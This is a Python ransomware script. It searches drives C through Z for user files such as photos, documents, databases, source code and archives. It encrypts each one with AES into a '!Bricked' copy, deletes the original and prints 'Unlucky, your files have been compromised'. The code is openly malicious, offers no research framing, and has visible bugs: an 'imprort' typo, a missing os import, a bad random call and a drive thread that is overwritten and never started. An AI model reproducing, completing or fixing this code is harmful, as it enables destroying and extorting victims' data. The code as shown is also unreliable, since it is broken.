
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import random
import sys
import pkg_resources
imprort threading
import itertools


ALL_FOUND_FILES = [] # all of the files found on the machine.

# Drive files, used for threading.
cFiles = []
dFiles = []
eFiles = []
fFiles = []
gFiles = []
hFiles = []
iFiles = []
jFiles = []
kFiles = []
lFiles = []
mFiles = []
nFiles = []
oFiles = []
pFiles = []
qFiles = []
rFiles = []
sFiles = []
tFiles = []
uFiles = []
vFiles = []
wFiles = []
xFiles = []
yFiles = []
zFiles = []



# Encryts a file with a key

def encrypt(key, filename):
    chunksize = 64 * 1024
    #Encrypt every file with .ext "!Bricked
    outFile = os.path.join(os.path.dirname(filename), "!Bricked" + os.path.basename(filename))
    
    filesize = str(os.path.getsize(filename)).zfill(16)
    
    # Initiialization vector.
    IV = ''

    for i in range(16):
        IV += chr(random.randint(0, 0xFF))

    encryption = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, "rb") as infile:
        with open(outFile, "wb") as outfile:
            outfile.write(filesize)
            outfile.write(IV)
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break

                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - (len(chunk) % 16))
                outfile.write(encryption.encrypt(chunk))


def brickSystem(key):

    if key == "":
	key = random(16);
	
    for target_file in ALL_FOUND_FILES:
        if os.path.basename(target_file).startswith("!Bricked"):
            pass
        elif target_file == os.path.join(os.getcwd(), sys.argv[0]):
            pass
        else:
         
            encrypt(SHA256.new(key).digest(), str(target_file))
            os.remove(target_file)
                

# Search every drive on the victims computer. Appending the file to the sysFile total list.

# Replace getcwd with '/root' for linux machines, or traverse all drives for windows machines.

def discoverFiles():
    
    #Start multi threads to search for these files faster.
    
    t1 = threading.Thread(target=Search_C_Drive)
    t2 = threading.Thread(target=Search_D_Drive)
    t3 = threading.Thread(target=Search_E_Drive)
    t4 = threading.Thread(target=Search_F_Drive)
    t5 = threading.Thread(target=Search_G_Drive)
    t6 = threading.Thread(target=Search_H_Drive)
    t7 = threading.Thread(target=Search_I_Drive)
    t8 = threading.Thread(target=Search_J_Drive)
    t9 = threading.Thread(target=Search_K_Drive)
    t10 = threading.Thread(target=Search_L_Drive)
    t11 = threading.Thread(target=Search_M_Drive)
    t12 = threading.Thread(target=Search_N_Drive)
    t13 = threading.Thread(target=Search_O_Drive)
    t14 = threading.Thread(target=Search_P_Drive)
    t15 = threading.Thread(target=Search_Q_Drive)
    t16 = threading.Thread(target=Search_R_Drive)
    t17 = threading.Thread(target=Search_S_Drive)
    t18 = threading.Thread(target=Search_T_Drive)
    t19 = threading.Thread(target=Search_U_Drive)
    t20 = threading.Thread(target=Search_V_Drive)
    t21 = threading.Thread(target=Search_W_Drive)
    t21 = threading.Thread(target=Search_X_Drive)
    t22 = threading.Thread(target=Search_Y_Drive)
    t23 = threading.Thread(target=Search_Z_Drive)
    
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    t9.start()
    t10.start()
    t11.start()
    t12.start()
    t13.start()
    t14.start()
    t15.start()
    t16.start()
    t17.start()
    t18.start()
    t19.start()
    t20.start()
    t21.start()
    t22.start()
    t23.start()
       
    t1.join()
    t2.join()
    t3.join()
    t4.join()
    t5.join()
    t6.join()
    t7.join()
    t8.join()
    t9.join()
    t10.join()
    t11.join()
    t12.join()
    t13.join()
    t14.join()
    t15.join()
    t16.join()
    t17.join()
    t18.join()
    t19.join()
    t20.join()
    t21.join()
    t22.join()
    t23.join()

    
       
    #Concatenate all of our found files.
    
    sysFiles = list(itertools.chain(cFiles,dFiles,eFiles,fFiles,gFiles,hFiles,iFiles,jFiles,kFiles,lFiles,mFiles,nFiles,oFiles,pFiles,
                                    qFiles,rFiles,sFiles,tFiles,uFiles,vFiles,wFiles,xFiles,yFiles,zFiles)
    
    
extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES ~ ! LETHAL TO ENCRYPT !
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # IMAGES
        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # AUDIO
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # VIDEOS 

        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OFFICE FILES
        'yml', 'yaml', 'json', 'xml', 'csv', # STRUCT DATA
        'db', 'sql', 'dbf', 'mdb', 'iso', # DATABASES | DISC IMAGES

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # WEB
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C-SOURCE
        'java', 'class', 'jar', # JAVA
        'ps', 'bat', 'vb', # WINDOW SCRIPTS
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # LINUX / MAC
        'go', 'py', 'pyc', 'bf', 'coffee', # OTHER 

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # COMPRESSED FILES
]


# Search functions for all drives
# Check if the file is a wanted extension


def Search_C_Drive():
	for dirpath, dirs, files in os.walk("C:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                cFiles.append(fname)
	

def Search_D_Drive():
    for dirpath, dirs, files in os.walk("D:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                dFiles.append(fname)

def Search_E_Drive():
    for dirpath, dirs, files in os.walk("E:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                eFiles.append(fname)

def Search_F_Drive():
    for dirpath, dirs, files in os.walk("F:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                fFiles.append(fname)

def Search_G_Drive():
    for dirpath, dirs, files in os.walk("G:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                gFiles.append(fname)

def Search_H_Drive():
    for dirpath, dirs, files in os.walk("H:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                hFiles.append(fname)

def Search_I_Drive():
    for dirpath, dirs, files in os.walk("I:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                iFiles.append(fname)

def Search_J_Drive():
    for dirpath, dirs, files in os.walk("J:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                jFiles.append(fname)

def Search_K_Drive():
    for dirpath, dirs, files in os.walk("K:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                kFiles.append(fname)

def Search_L_Drive():
    for dirpath, dirs, files in os.walk("L:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                lFiles.append(fname)

def Search_M_Drive():
    for dirpath, dirs, files in os.walk("M:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                mFiles.append(fname)

def Search_N_Drive():
    for dirpath, dirs, files in os.walk("N:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                nFiles.append(fname)

def Search_O_Drive():
    for dirpath, dirs, files in os.walk("O:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                oFiles.append(fname)

def Search_P_Drive():
    for dirpath, dirs, files in os.walk("P:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                pFiles.append(fname)

def Search_Q_Drive():
    for dirpath, dirs, files in os.walk("Q:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                qFiles.append(fname)

def Search_R_Drive():
    for dirpath, dirs, files in os.walk("R:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                rFiles.append(fname)

def Search_S_Drive():
    for dirpath, dirs, files in os.walk("S:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sFiles.append(fname)

def Search_T_Drive():
    for dirpath, dirs, files in os.walk("T:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                tFiles.append(fname)

def Search_U_Drive():
    for dirpath, dirs, files in os.walk("U:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                uFiles.append(fname)

def Search_V_Drive():
    for dirpath, dirs, files in os.walk("V:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                vFiles.append(fname)

def Search_W_Drive():
    for dirpath, dirs, files in os.walk("W:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                wFiles.append(fname)

def Search_X_Drive():
    for dirpath, dirs, files in os.walk("X:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                xFiles.append(fname)

def Search_Y_Drive():
    for dirpath, dirs, files in os.walk("Y:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                yFiles.append(fname)

def Search_Z_Drive():
    for dirpath, dirs, files in os.walk("Z:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                zFiles.append(fname)



def main():
    user_key = "EXAMPLE KEY" 
                    
    discoverFiles() # Find all files   
                    
    brickSystem(user_key)
    print("Unlucky, your files have been compromised")
   
    


